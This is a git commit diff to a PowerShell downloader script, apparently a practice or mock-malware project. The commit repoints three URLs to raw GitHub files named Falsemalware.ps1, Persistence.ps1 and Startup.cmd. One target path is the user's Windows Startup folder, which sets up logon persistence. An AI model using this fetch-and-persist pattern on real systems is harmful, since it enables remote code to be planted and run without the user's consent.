8088ca8acd270810188678d2416cb96eab0f1d19
Freecil <128537217+Freecil@users.noreply.github.com>
2023-04-10 11:58:42 +0200

    Update Downloader.ps1

--- Downloader.ps1
+++ Downloader.ps1
@@ -1,7 +1,7 @@
 
-$url = "https://github.com/Freecil/Prjoetls/blob/475c44bf721eca0f17cef81af241f9971d8c929e/Falsemalware.ps1"
-$url3 = "https://github.com/Freecil/Prjoetls/blob/371f0c98311f52559748f1f963179872c8aea582/Persistence.ps1"
-$url4 = "https://github.com/Freecil/Prjoetls/blob/b7721dec175d66f83df5febcb78595dc1f229fe6/Startup.cmd"
+$url = "https://raw.githubusercontent.com/Freecil/Projects/main/Falsemalware.ps1"
+$url3 = "https://raw.githubusercontent.com/Freecil/Projects/main/Persistence.ps1"
+$url4 = "https://raw.githubusercontent.com/Freecil/Projects/main/Startup.cmd"
 $FileFalsemalware = "C:\temp\Falsemalware.ps1"
 $FilePeristence = "C:\temp\Persistence.ps1"
 $FileStartup = "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Startup.cmd"
